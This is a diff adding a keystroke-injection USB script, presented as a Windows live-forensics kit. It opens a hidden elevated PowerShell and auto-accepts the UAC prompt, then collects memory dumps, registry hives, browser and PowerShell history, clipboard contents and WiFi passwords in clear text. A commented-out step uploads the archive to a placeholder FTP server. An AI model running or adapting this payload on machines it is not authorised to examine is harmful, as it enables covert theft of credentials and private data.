@@ -1,0 +1,147 @@
+REM ======== HackDucky Script: forensic_response_kit.txt ========
+REM Author: Devaansh Pathak
+REM Purpose: Full-spectrum live forensic response script for Windows systems
+
+REM === STEP 1: Launch Hidden Admin PowerShell ===
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell -windowstyle hidden -Command "Start-Process powershell -ArgumentList '-windowstyle hidden' -Verb runAs"
+ENTER
+DELAY 2500
+ALT y
+DELAY 2000
+
+REM === STEP 2: Set Up Working Directories ===
+STRING mkdir C:\IR_Kit\{Memory,Logs,Registry,Network,Triage,Timeline,Browser,Drivers,Services,Extras}
+ENTER
+
+REM === STEP 3: Download Required Tools from Sysinternals ===
+STRING cd C:\IR_Kit
+ENTER
+STRING powershell iwr https://live.sysinternals.com/procdump.exe -OutFile procdump.exe
+ENTER
+STRING powershell iwr https://live.sysinternals.com/handle.exe -OutFile handle.exe
+ENTER
+STRING powershell iwr https://live.sysinternals.com/tcpvcon.exe -OutFile tcpvcon.exe
+ENTER
+STRING powershell iwr https://live.sysinternals.com/autoruns.exe -OutFile autoruns.exe
+ENTER
+STRING powershell iwr https://live.sysinternals.com/psloggedon.exe -OutFile psloggedon.exe
+ENTER
+STRING powershell iwr https://live.sysinternals.com/whois.exe -OutFile whois.exe
+ENTER
+DELAY 10000
+
+REM === STEP 4: Dump Memory of Explorer.exe ===
+STRING .\procdump.exe -ma -accepteula -o -s 3 -n 1 -w explorer.exe C:\IR_Kit\Memory\explorer.dmp
+ENTER
+
+REM === STEP 5: Dump Process List, Open Handles, Users ===
+STRING tasklist > C:\IR_Kit\Triage\running_processes.txt
+ENTER
+STRING .\handle.exe > C:\IR_Kit\Triage\open_handles.txt
+ENTER
+STRING query user > C:\IR_Kit\Triage\loggedin_users.txt
+ENTER
+STRING .\psloggedon.exe > C:\IR_Kit\Triage\psloggedon.txt
+ENTER
+
+REM === STEP 6: Extract Registry Hives ===
+STRING reg save HKLM\SYSTEM C:\IR_Kit\Registry\SYSTEM.hiv
+ENTER
+STRING reg save HKLM\SOFTWARE C:\IR_Kit\Registry\SOFTWARE.hiv
+ENTER
+STRING reg save HKCU C:\IR_Kit\Registry\NTUSER.dat
+ENTER
+
+REM === STEP 7: Network Artifact Collection ===
+STRING ipconfig /all > C:\IR_Kit\Network\network_config.txt
+ENTER
+STRING netstat -anob > C:\IR_Kit\Network\netstat_connections.txt
+ENTER
+STRING arp -a > C:\IR_Kit\Network\arp_cache.txt
+ENTER
+STRING .\tcpvcon.exe > C:\IR_Kit\Network\tcpvcon.txt
+ENTER
+STRING route print > C:\IR_Kit\Network\routing_table.txt
+ENTER
+
+REM === STEP 8: Scheduled Tasks, Autoruns, Services ===
+STRING schtasks /query /fo LIST /v > C:\IR_Kit\Triage\scheduled_tasks.txt
+ENTER
+STRING .\autoruns.exe -a * -h -nobanner -accepteula -c C:\IR_Kit\Triage\autoruns.csv
+ENTER
+STRING sc query state= all > C:\IR_Kit\Services\all_services.txt
+ENTER
+STRING sc qc winlogon > C:\IR_Kit\Services\winlogon_config.txt
+ENTER
+
+REM === STEP 9: Drivers and Kernel Modules ===
+STRING driverquery /v /fo csv > C:\IR_Kit\Drivers\drivers.csv
+ENTER
+
+REM === STEP 10: Timeline and File Metadata ===
+STRING dir C:\ /S /T:C > C:\IR_Kit\Timeline\created.txt
+ENTER
+STRING dir C:\ /S /T:A > C:\IR_Kit\Timeline\accessed.txt
+ENTER
+STRING dir C:\ /S /T:W > C:\IR_Kit\Timeline\modified.txt
+ENTER
+
+REM === STEP 11: PowerShell Command History ===
+STRING copy "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" C:\IR_Kit\Extras\ps_history.txt
+ENTER
+
+REM === STEP 12: Clipboard Contents Dump ===
+STRING powershell Get-Clipboard > C:\IR_Kit\Extras\clipboard.txt
+ENTER
+
+REM === STEP 13: Dump Chrome/Edge History ===
+STRING copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\History" C:\IR_Kit\Browser\chrome_history.db
+ENTER
+STRING copy "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History" C:\IR_Kit\Browser\edge_history.db
+ENTER
+
+REM === STEP 14: BitLocker and TPM Info ===
+STRING manage-bde -status > C:\IR_Kit\Extras\bitlocker_status.txt
+ENTER
+STRING tpmtool getdeviceinformation > C:\IR_Kit\Extras\tpm_info.txt
+ENTER
+
+REM === STEP 15: USB Device History ===
+STRING powershell "Get-WmiObject Win32_USBControllerDevice | ForEach { [wmi]($_.Dependent) } | Select Name, Manufacturer" > C:\IR_Kit\Extras\usb_devices.txt
+ENTER
+
+REM === STEP 16: Restore Points & Shadow Copies ===
+STRING vssadmin list shadows > C:\IR_Kit\Extras\shadowcopies.txt
+ENTER
+STRING wmic shadowcopy get ID, InstallDate, VolumeName > C:\IR_Kit\Extras\restore_points.txt
+ENTER
+
+REM === STEP 17: Antivirus Status (Defender or 3rd-party) ===
+STRING powershell Get-MpComputerStatus > C:\IR_Kit\Extras\antivirus_status.txt
+ENTER
+
+REM === STEP 18: WiFi Profiles ===
+STRING netsh wlan show profiles > C:\IR_Kit\Network\wifi_profiles.txt
+ENTER
+STRING netsh wlan export profile folder=C:\IR_Kit\Network key=clear
+ENTER
+
+REM === STEP 19: Archive the IR Dump ===
+STRING powershell Compress-Archive -Path C:\IR_Kit\* -DestinationPath C:\IR_Response_%COMPUTERNAME%_%DATE%.zip
+ENTER
+
+REM === STEP 20: (Optional) Auto-Copy to USB or Upload to FTP ===
+REM STRING copy C:\IR_Response_*.zip E:\  (Change E: to correct drive letter)
+REM STRING powershell -Command "(New-Object Net.WebClient).UploadFile('ftp://yourftpserver.com/ir.zip','C:\IR_Response.zip')"
+
+REM === STEP 21: Cleanup (Optional) ===
+REM STRING Remove-Item C:\IR_Kit -Recurse -Force
+
+REM === STEP 22: Completion Echo ===
+STRING echo "✅ Forensic Response Complete. Archive ready at C:\IR_Response_*.zip"
+ENTER
+
+REM === END OF SCRIPT ===
